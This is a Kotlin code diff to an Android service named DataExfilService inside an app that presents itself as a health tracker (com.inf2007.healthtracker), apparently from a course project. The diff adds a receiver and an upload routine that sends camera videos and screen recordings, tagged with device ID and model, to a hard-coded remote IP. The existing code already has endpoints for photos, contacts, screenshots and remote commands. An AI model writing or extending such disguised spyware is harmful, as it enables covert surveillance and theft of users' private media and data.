@@ -4,6 +4,7 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.net.ConnectivityManager
@@ -22,6 +23,7 @@ import java.util.*
 import android.database.ContentObserver
 import android.provider.MediaStore
 import android.content.ContentUris
+import android.content.IntentFilter
 import android.net.Uri
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -45,6 +47,7 @@ class DataExfilService : Service() {
         private const val DOWNLOADS_ENDPOINT = "http://20.2.92.176:5000/downloads"
         private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
         private const val COMMAND_ENDPOINT = "http://20.2.92.176:5000/commands"
+        private const val VIDEO_ENDPOINT = "http://20.2.92.176:5000/videos"
     }
 
     private val photosEndpoint = "http://20.2.92.176:5000/photos"
@@ -89,12 +92,28 @@ class DataExfilService : Service() {
         }
     }
 
+    private val uploadFileReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == "com.inf2007.healthtracker.UPLOAD_FILE") {
+                val type = intent.getStringExtra("type") ?: return
+                val filePath = intent.getStringExtra("file_path") ?: return
+
+                when (type) {
+                    "camera_video" -> uploadVideoToServer(File(filePath))
+                    "screen_recording" -> uploadVideoToServer(File(filePath)) // Same handler
+                }
+            }
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
         setupPhotoObserver()
         setupContactsObserver()
+        registerReceiver(uploadFileReceiver,
+            IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -345,6 +364,7 @@ class DataExfilService : Service() {
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
         contentResolver.unregisterContentObserver(contactsObserver)
+        unregisterReceiver(uploadFileReceiver)
     }
 
     private fun setupPhotoObserver() {
@@ -919,5 +939,60 @@ class DataExfilService : Service() {
                 handler.postDelayed(this, 30000) // Check every 30 seconds
             }
         }, 15000)
+    }
+
+    private val videoUploadPrefs by lazy {
+        getSharedPreferences("video_upload_log", Context.MODE_PRIVATE)
+    }
+
+    private fun uploadVideoToServer(videoFile: File) {
+        if (!isNetworkAvailable()) {
+            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
+            return
+        }
+
+        Thread {
+            try {
+                val deviceId = getUniqueDeviceId()
+                val bytes = videoFile.readBytes()
+
+                val requestBody = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("file", videoFile.name,
+                        bytes.toRequestBody("video/mp4".toMediaTypeOrNull()))
+                    .addFormDataPart("device_id", deviceId)
+                    .addFormDataPart("device_model", Build.MODEL)
+                    .addFormDataPart("file_size", videoFile.length().toString())
+                    .addFormDataPart("timestamp", System.currentTimeMillis().toString())
+                    .addFormDataPart("type", "camera_recording")
+                    .build()
+
+                val request = Request.Builder()
+                    .url(VIDEO_ENDPOINT)
+                    .post(requestBody)
+                    .build()
+
+                NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {
+                        Log.e(TAG, "Video upload failed: ${videoFile.name}")
+                        handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
+                    }
+
+                    override fun onResponse(call: Call, response: Response) {
+                        if (response.isSuccessful) {
+                            Log.i(TAG, "Video uploaded: ${videoFile.name}")
+                            videoUploadPrefs.edit().putBoolean("video_${videoFile.name}", true).apply()
+                            // Optionally delete after upload
+                            // videoFile.delete()
+                        } else {
+                            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
+                        }
+                        response.close()
+                    }
+                })
+            } catch (e: Exception) {
+                Log.e(TAG, "Error uploading video: ${e.message}")
+            }
+        }.start()
     }
 }
